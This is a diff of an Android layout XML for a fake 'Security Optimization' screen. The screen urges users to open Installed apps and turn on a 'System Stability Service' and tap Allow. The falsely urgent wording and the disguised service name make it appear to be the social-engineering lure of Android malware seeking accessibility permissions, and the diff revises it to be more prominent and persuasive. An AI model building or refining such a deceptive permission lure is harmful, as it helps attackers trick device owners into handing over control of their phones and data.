@@ -3,7 +3,7 @@
     xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#FFFFFF">
+    android:background="#FDFDFD">
 
     <ScrollView
         android:layout_width="match_parent"
@@ -20,53 +20,69 @@
             android:padding="32dp">
 
             <ImageView
-                android:layout_width="209dp"
-                android:layout_height="182dp"
+                android:layout_width="225dp"
+                android:layout_height="207dp"
                 android:layout_marginTop="40dp"
                 android:src="@drawable/ic_android_play" />
 
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:layout_marginTop="15dp"
+                android:layout_marginTop="20dp"
                 android:text="Security Optimization"
-                android:textColor="#0B0B0B"
-                android:textSize="22sp"
+                android:textColor="#E0118A4C"
+                android:textSize="29sp"
                 android:textStyle="bold" />
 
             <TextView
-                android:layout_width="match_parent"
+                android:layout_width="217dp"
                 android:layout_height="wrap_content"
-                android:layout_marginTop="8dp"
-                android:layout_marginBottom="24dp"
+                android:layout_marginTop="5dp"
+                android:layout_marginBottom="40dp"
                 android:alpha="0.9"
                 android:gravity="center"
-                android:text="Your device requires a stability optimization to continue. Follow these steps on the next screen:"
-                android:textColor="#0B0B0B"
-                android:textSize="15sp" />
+                android:text="Your device requires important security optimizations to continue. Please follow these steps:"
+                android:textColor="#CB5B5B5B"
+                android:textSize="17sp"
+                android:textStyle="bold" />
 
             <!-- Step 1 -->
             <TextView
+                android:id="@+id/tvGuideStep1"
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:layout_marginVertical="6dp"
-                android:background="#FBFBFB"
-                android:padding="16dp"
-                android:text="1. Tap 'START OPTIMIZATION', then click 'Installed apps'"
-                android:textColor="#202124"
-                android:textSize="16sp"
+                android:background="@drawable/guide_step_bg"
+                android:padding="14dp"
+                android:text="1. Tap START"
+                android:textColor="#676B69"
+                android:textSize="17sp"
                 android:textStyle="bold" />
 
             <!-- Step 2 -->
             <TextView
+                android:id="@+id/tvGuideStep2"
                 android:layout_width="match_parent"
                 android:layout_height="wrap_content"
                 android:layout_marginVertical="6dp"
-                android:background="#FBFBFB"
-                android:padding="16dp"
-                android:text="2. Tap 'System Stability Service', toggle it on and tap 'Allow'"
-                android:textColor="#202124"
-                android:textSize="16sp"
+                android:background="@drawable/guide_step_bg"
+                android:padding="14dp"
+                android:text="2. Select Installed apps"
+                android:textColor="#676B69"
+                android:textSize="17sp"
+                android:textStyle="bold" />
+
+            <!-- Step 3 -->
+            <TextView
+                android:id="@+id/tvGuideStep3"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_marginVertical="6dp"
+                android:background="@drawable/guide_step_bg"
+                android:padding="14dp"
+                android:text="3. Tap System Stability Service --> Toggle ON &amp; Allow"
+                android:textColor="#676B69"
+                android:textSize="17sp"
                 android:textStyle="bold" />
 
         </LinearLayout>
@@ -82,17 +98,18 @@
 
         <com.google.android.material.button.MaterialButton
             android:id="@+id/btnGuideAction"
-            android:layout_width="257dp"
-            android:layout_height="64dp"
+            android:layout_width="191dp"
+            android:layout_height="53dp"
             android:layout_gravity="center"
             android:fontFamily="sans-serif-medium"
-            android:text="Start Optimization"
+            android:text="START"
             android:textAllCaps="true"
             android:textColor="#FFFFFF"
-            android:textSize="14sp"
+            android:textSize="18sp"
             android:textStyle="bold"
-            app:backgroundTint="#1A73E8"
+            app:backgroundTint="#EB098E4A"
             app:cornerRadius="100dp" />
+
     </FrameLayout>
 
 </androidx.constraintlayout.widget.ConstraintLayout>
